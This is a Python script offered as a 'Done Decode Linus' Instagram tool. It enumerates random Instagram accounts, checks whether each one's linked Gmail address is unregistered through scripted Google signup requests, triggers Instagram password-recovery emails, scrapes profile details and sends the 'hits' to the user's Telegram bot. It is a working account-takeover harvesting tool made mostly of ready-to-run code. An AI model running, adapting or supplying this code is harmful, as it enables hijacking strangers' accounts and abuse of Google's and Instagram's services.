#Done Decode Linus : By - @c8vla - @c8vla
import requests
import os
import webbrowser
webbrowser.open('https://t.me/c8vla')
try:
	import random
	import sys
	import requests
	import time
	from threading import Thread
	from user_agent import generate_user_agent
	import threading
	from ms4 import UserAgentGenerator
	from random import randrange
	import pyfiglet
	import uuid
	from ms4 import Instagram
except ImportError:
	os.system('pip install random')
	os.system('pip install requests')
	os.system('pip install time')
	os.system('pip install pyfiglet')
	os.system('pip install uuid')
	os.system('pip install threading')
	os.system('pip install user_agent')
	os.system('pip install ms4')
	os.system('clear')
	

host=''.join(random.choice("qwerytuiopasdfghjklzxcvbnm")for i in range(random.randrange(15,30)))
ua = str(generate_user_agent())


R = "\033[1;31m" #احمر
G = "\033[1;32m" #اخضر
Y = "\033[1;33m" #اصفر
B = "\033[1;34m" #ازرق
rest = "\033[0m" #استرجاع اللون الى الون الصلي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
SA = '\x1b[38;5;216m'
S2A = '\x1b[1;36m'
S3A = '\x1b[38;5;180m'
S4A= '\x1b[38;5;88m' 
S5A = "\x1b[1;32m" 
S6A= '\x1b[38;5;166m'
K = '\033[2;35m'
a1='\x1b[38;5;161m'#وردي جميل جدا
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي

#########################

q=0
w=0
e=0
r=0
ids=[]

########################

email = ''
print(f'''
{Y}— — — — — — — — — — — — — —
{a38}How Are You Today Are you well?

{a20} Done Decode Linus Tool 

{a1}The Tool - Instagram Available 

{a38}Tool programmer • @pltqv
{Y}— — — — — — — — — — — — — —

''')

token = input(a23+'\n • Enter The Token :- ')
print(a13+'— '*15)
ID = input(a16+' • Enter The ID :- ')
os.system('clear')

def checker(user):
	global q,w,e,r
	email = user + '@gmail.com'
	ins= Instagram.CheckInsta(email)['Is_Available']
	if ins == 'true':
		q+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''
{G}Hits » {w} 
{a13}Good insta » {q} 
{R}Bad insta » {r} 
{Y}Bad Gmail » {e}
{a40}email » {email}		
		
''')
		cookies = {
		    '__Host-GAPS': host
		}
		
		headers = {
		    'authority': 'accounts.google.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		    'google-accounts-xsrf': '1',
		    'origin': 'https://accounts.google.com',
		    'referer': 'https://accounts.google.com/signup/v2/createaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&parent_directed=true&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-arch': '""',
		    'sec-ch-ua-bitness': '""',
		    'sec-ch-ua-full-version': '"124.0.6327.4"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"Infinix X6833B"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"14.0.0"',
		    'sec-ch-ua-wow64': '?0',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': ua,
		    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
		    'x-client-data': 'CPLkygEIxZrNAQ==',
		    'x-same-domain': '1',
		}
		
		params = {
		    'hl': 'ar',
		    '_reqid': '81568',
		    'rt': 'j',
		}
		
		data = 'continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&service=accountsettings&ddm=0&f.req=%5B%22AEThLlwBsFBBllEq5wEU6RJs0mT91cHeNKMadpXct3xiKalDekJsy_X4hoW-E7e4__FsihPEySsK16ryyJ6VSUOMWcWNhrLNoBCiZ8EKWqWC7be9ZXBjBPKBmzCKOlET0o74En4RWQFORsOHXJ2hQ98rpQcZ9nHwhbs41fWIgRKBe1xCgsQiHcRgXnhaFTahScSmrxOJUNgt%22%2C%22hsjb%22%2C%22jjjo%22%2C%22hsjb%22%2C%22jjjo%22%2C0%2C0%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C1%2C%5B%5D%2C1%5D&at=AFoagUXNx7dIcKFc6q4nd_KxsUu7zxyZLg%3A1729193950789&azt=AFoagUUBcPi-h2G1K8pRfGeloD9MbzNUHw%3A1729193950789&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A233&checkedDomains=youtube&pstMsg=1&'
		
		response = requests.post(
		    'https://accounts.google.com/_/signup/validatepersonaldetails',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
		
		tok=(response.text.split('"gf.ttu",null,"')[1].split('"]')[0])
		Hos=(response.cookies.get_dict()['__Host-GAPS'])
		
		
		cookies = {
		    '__Host-GAPS': Hos
		}
		
		headers = {
		    'authority': 'accounts.google.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		    'google-accounts-xsrf': '1',
		    'origin': 'https://accounts.google.com',
		    f'referer': 'https://accounts.google.com/signup/v2/birthdaygender?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&parent_directed=true&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tok}',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-arch': '""',
		    'sec-ch-ua-bitness': '""',
		    'sec-ch-ua-full-version': '"124.0.6327.4"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"Infinix X6833B"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"14.0.0"',
		    'sec-ch-ua-wow64': '?0',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': ua,
		    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
		    'x-client-data': 'CPLkygEIxZrNAQ==',
		    'x-same-domain': '1',
		}
		
		params = {
		    'hl': 'ar',
		    'TL': tok,
		    '_reqid': '281568',
		    'rt': 'j',
		}
		yy = str(random.randrange(2018,2022))
		mm = str(random.randrange(1,12))
		dd = str(random.randrange(1,28))
		data = f'continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&service=accountsettings&ddm=0&f.req=%5B%22TL%3A{tok}%22%2C'+yy+'%2C'+mm+'%2C'+dd+'%2C2%2Cnull%2Cnull%2C0%2Cnull%2Cnull%2C0%2C0%5D&at=AFoagUXNx7dIcKFc6q4nd_KxsUu7zxyZLg%3A1729193950789&azt=AFoagUUBcPi-h2G1K8pRfGeloD9MbzNUHw%3A1729193950789&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A233&checkedDomains=youtube&pstMsg=1&'
		
		res = requests.post(
		    'https://accounts.google.com/_/signup/validatebasicinfo',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
		
		TL=(res.text.split('"TL:')[1].split('",13,')[0])
		
		
		cookies = {
		    '__Host-GAPS': Hos
		}
		
		headers = {
		    'authority': 'accounts.google.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		    'google-accounts-xsrf': '1',
		    'origin': 'https://accounts.google.com',
		    'referer': 'https://accounts.google.com/signup/v2/createusername?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&parent_directed=true&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=APps6eaDdePgsydeNHBhxHpKyBu85UgmenOCCfj_MOBZ8BuuzzjgdkWpzS03u2kb',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-arch': '""',
		    'sec-ch-ua-bitness': '""',
		    'sec-ch-ua-full-version': '"124.0.6327.4"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"Infinix X6833B"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"14.0.0"',
		    'sec-ch-ua-wow64': '?0',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': ua,
		    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
		    'x-client-data': 'CPLkygEIxZrNAQ==',
		    'x-same-domain': '1',
		}
		
		params = {
		    'hl': 'ar',
		    'TL': TL,
		    '_reqid': '481568',
		    'rt': 'j',
		}
		
		data = f'continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fnlr%3D1&hl=ar&service=accountsettings&ddm=0&f.req=%5B%22TL%3A{TL}%22%2C%22{user}%22%2C0%2C0%2C1%2Cnull%2C0%2C29011%5D&at=AFoagUXNx7dIcKFc6q4nd_KxsUu7zxyZLg%3A1729193950789&azt=AFoagUUBcPi-h2G1K8pRfGeloD9MbzNUHw%3A1729193950789&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A233&checkedDomains=youtube&pstMsg=1&'
		
		req = requests.post(
		    'https://accounts.google.com/_/signup/usernameavailability',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
		
		
		if '"gf.uar",1' in req.text:
			w+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''
{G}Hits » {w} 
{a13}Good insta » {q} 
{R}Bad insta » {r} 
{Y}Bad Gmail » {e}
{a40}email » {email}		
		
''')
			
			headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
             'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
			data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
            'ig_sig_key_version': '4',
        }
			reso = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
			
			cookies = {
			    'ig_did': '1DE3A5D0-A9E6-41AE-A389-ED36F72A90CF',
			    'ig_nrcb': '1',
			    'mid': 'ZrQhnAABAAGBdscjjB-Fb3_pcDhQ',
			    'datr': 'nCG0Zucex87H44J0VQJbhvIe',
			    'fbm_124024574287414': 'base_domain=.instagram.com',
			    'dpr': '3.2983407974243164',
			    'ps_l': '1',
			    'ps_n': '1',
			    'csrftoken': 'g8gnoPZQPjPnN6ozxUZ26LcRG2RQc9v1',
			    'wd': '891x1703',
			}
			
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'referer': 'https://www.instagram.com/c.s3y/',
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-model': '""',
			    'sec-ch-ua-platform': '"Linux"',
			    'sec-ch-ua-platform-version': '""',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': ua,
			    'x-asbd-id': '129477',
			    'x-csrftoken': 'g8gnoPZQPjPnN6ozxUZ26LcRG2RQc9v1',
			    'x-ig-app-id': '936619743392459',
			    'x-ig-www-claim': '0',
			    'x-requested-with': 'XMLHttpRequest',
			}
			
			params = {
			    'username': user,
			}
			
			response = requests.get(
			    'https://www.instagram.com/api/v1/users/web_profile_info/',
			    params=params,
			    cookies=cookies,
			    headers=headers,
			).json()
			try:
				name = response['data']['user']['full_name']
			except:
				name = None
			try:
				fols = response['data']['user']['edge_followed_by']['count']
			except:
				fols = None
			try:
				folg = response['data']['user']['edge_follow']['count']
			except:
				folg = None
			try:
				Id = response['data']['user']['id']
			except:
				Id = None
			try:
				pr = response['data']['user']['is_private']
			except:
				pr = None
			try:
				bio = response['data']['user']['biography']
			except:
				bio = None
			try:
				post = response['data']['user']['edge_owner_to_timeline_media']['count']
			except:
				post = None
			try:
				resst = reso.json()['email']
			except:
				resst = None
			try:
				date = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()['date']
			except:
				data = None
			try:
				tlg = (f'''
<<━═━═━═━═━━═━═━═━>>
Done Decode Linus 𖣂.
<<━═━═━═━═━━═━═━═━>>
 
[@] Full_Name • {name}
[@] User • {user}
[@] Email • {email}
[@] Followers  • {fols}
[@] Following • {folg}
[@] Bio • {bio}
[@] Post • {post}
[@] Rest • {resst}
[@] ID • {Id}
[@] data • {data}
[@] Private • {pr}
[@] URL • https://t.me/c8vla

 BY @pltqv  |   

<<━═━═━═━═━━═━═━═━>>

''')
				print(tlg)
				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
			except Exception:
				ff = (f'''
صادلك حساب بدون معلومات			
<<<~━═━═━═━TIX═━━═━═━═━>>>			

User • {user}

email • {email}

<<<~━═━═━═━TIX═━━═━═━═━>>>
''')
			print(ff)
			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
		else:
			e+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''
{G}Hits » {w} 
{a13}Good insta » {q} 
{R}Bad insta » {r} 
{Y}Bad Gmail » {e}
{a40}email » {email}		
		
''')
			
	else:
		r+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''
{G}Hits » {w} 
{a13}Good insta » {q} 
{R}Bad insta » {r} 
{Y}Bad Gmail » {e}
{a40}email » {email}		
		
''')
	
def rand_ids():  
  Id= str(random.randrange(266028916, 1900000000))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids()
    
def username1():
  global check
  try:
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}
      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      user =response.json()['data']['user']['username'] 
      checker(user)
  except :
  	username1()

for i in range(15):
  Thread(target=username1).start()
  
 